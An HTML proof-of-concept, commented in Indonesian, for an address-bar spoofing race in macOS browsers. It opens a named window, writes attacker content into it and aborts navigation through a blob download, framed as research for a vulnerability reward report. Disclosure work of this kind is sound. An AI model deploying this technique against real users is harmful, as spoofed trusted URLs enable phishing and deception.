<!-- 09 - named-window race + abort unduhan blob   [address-bar spoofing | macOS: Dia/Arc/Chrome macOS]
     MEKANISME : pembatal = navigasi ke blob octet-stream: browser mengunduh dan TIDAK menukar dokumen. Efek samping jinak: 1 file kecil.
     PREDIKAT  : bilah tinggal di URL tepercaya; dokumen penyerang bertahan.
     AMAN      : dokumen tertimpa.
     ETIKA     : browser & mesin sendiri. Nol form, nol kredensial, nol fetch/beacon, nol resource luar.
                 "www.google.com" = label tak-berbahaya; example.com = origin uji (IANA reserved).
                 Berhenti di predikat -> screenshot -> lapor VRP. Bukan kit phishing. -->
<meta charset="utf-8"><title>09 named-window race + abort unduhan blob</title>
<button onclick="go()" style="font:16px system-ui;padding:12px 22px">RUN</button>
<p id="o" style="font:12px ui-monospace,monospace;color:#555"></p>
<script>
var w;o.textContent='REAL: '+location.origin;
function race(){try{w.location.href!=='about:blank';}catch(e){w.location.href=URL.createObjectURL(new Blob(['x'],{type:'application/octet-stream'}));}}
function go(){w=window.open('https://192.0.2.1/','x');w.document.write('<h3>BUKAN google.com - '+location.origin+'</h3>');setInterval(race,0);}
</script>
